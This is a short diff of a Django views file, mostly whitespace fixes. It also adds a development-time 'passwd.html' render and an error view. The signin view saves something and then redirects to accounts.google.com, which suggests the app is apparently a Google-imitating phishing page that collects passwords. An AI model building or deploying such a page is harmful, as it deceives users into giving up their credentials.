@@ -4,7 +4,7 @@ from datetime import datetime
 
 
 def index(request):
-    return render(request,'index.html')
+    return render(request, 'index.html')
 
 
 def signin(request):
@@ -16,6 +16,14 @@ def signin(request):
         save_status = True
 
     if save_status:
-        return HttpResponsePermanentRedirect ('https://accounts.google.com')
+        return HttpResponsePermanentRedirect('https://accounts.google.com')
 
+    # to load passwd page while development, comment below line in deployment
+    return render(request, 'passwd.html')
+
+    # for deployment
     return index(request)
+
+
+def error(request):
+    return render(request, '400.html')
